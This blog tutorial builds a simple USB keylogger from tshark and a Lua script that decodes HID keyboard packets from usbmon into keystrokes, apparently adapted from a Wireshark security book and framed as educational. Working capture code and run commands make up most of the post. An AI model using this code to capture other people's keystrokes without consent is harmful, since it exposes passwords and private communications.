---
layout: post
title:  "Using tshark as a keylogger"
categories: linux tshark hacking
---

Have you ever wondered how keyloggers work at a network packet level? In this post, we'll explore how to create a simple USB keylogger using tshark and Lua scripting. This implementation is based on examples from the book "Wireshark for Security Professionals" and serves as an educational demonstration of USB packet analysis.

> **Note**: This tutorial is for educational purposes only. Always ensure you have proper authorization before monitoring any system or network traffic.

## Prerequisites

This tutorial was tested on a Kali Linux ARM64 VM. You'll need:
- Kali Linux (or any Linux distribution)
- tshark installed
- Root access

## Setting Up the Environment

First, install tshark if you haven't already:

```bash
sudo apt install tshark
```

Next, we need to enable USB monitoring. This is done by loading the usbmon kernel module:

```bash
sudo modprobe usbmon
```

## The Keylogger Script

Create a file named `keysniffer.lua` with the following Lua script. This script processes USB packets and maps them to keystrokes using the USB HID Usage Tables specification:

```lua
--we want to capture usb data for each packet
local usbdata = Field.new("usb.capdata")
--the listener function, will create our tap
local function init_listener()
  print("[*] Started KeySniffing…\n")
  --only listen for usb packets
  local tap = Listener.new("usb")

  --called for every packet meeting the filter set for the Listener(), so usb packets
  function tap.packet(pinfo, tvb)
    --list from http://www.usb.org/developers/devclass_docs/Hut1_11.pdf
    local keys = "????abcdefghijklmnopqrstuvwxyz1234567890\n??\t -=[]\\?;??,./"
    --get the usb.capdata
    local data = usbdata()
    --make sure the packet actually has a usb.capdata field
    if data ~= nil then
      local keycodes = {}
      local i = 0
      --match on everything that is a hex byte %x and add it to the table
      --this works b/c data is in format %x:%x:%x:%x
      --it is effectively pythons split(':') function
      for v in string.gmatch(tostring(data), "%x+") do
        i = i + 1
        keycodes[i] = v
      end
      --make sure we got a keypress, which is the 3rd value
      --this works on a table b/c we are using int key values
      if #keycodes < 3 then
        return
      end
      --convert the hex key to decimal
      local code = tonumber(keycodes[3], 16) + 1
      --get the right key mapping
      local key = keys:sub(code, code)
      --as long as it isn't '?' lets print it to stdout
      if key ~= '?' then
        io.write(key)
        io.flush()
      end
    end
  end

  --this is called when capture is reset
  function tap.reset()
    print("[*] Done Capturing")
  end

  --function called at the end of tshark run
  function tap.draw()
    print("\n\n[*] Done Processing")
  end
end

init_listener()
```

## Running the Keylogger

With everything set up, you can now run the keylogger using:

```bash
tshark -Q -i usbmon3 -Xlua_script:keysniffer.lua
```

Now press some keys on the keyboard on interface 3 and see the output in the terminal.

The command breakdown:
- `-Q`: Quiet mode (no packet information displayed)
- `-i usbmon3`: Monitor USB interface 3 (you can change this to usbmon0, usbmon1, etc. use lsusb to find your device interface)
- `-Xlua_script:keysniffer.lua`: Load our Lua script

## How It Works

The script works by:
1. Creating a listener for USB packets
2. Extracting the USB capture data from each packet
3. Parsing the keycodes using the USB HID Usage Tables
4. Converting the keycodes to their corresponding characters
5. Outputting the captured keystrokes in real-time

## References

This implementation is based on examples from ["Wireshark for Security Professionals"](https://web.archive.org/web/20240219211359/https://computerscience.unicam.it/marcantoni/reti/laboratorio_wireshark/Wireshark%20for%20Security%20Professionals%20-%20Using%20Wireshark%20and%20the%20Metasploit%20Framework.pdf), which provides excellent insights into network security analysis using Wireshark and related tools.

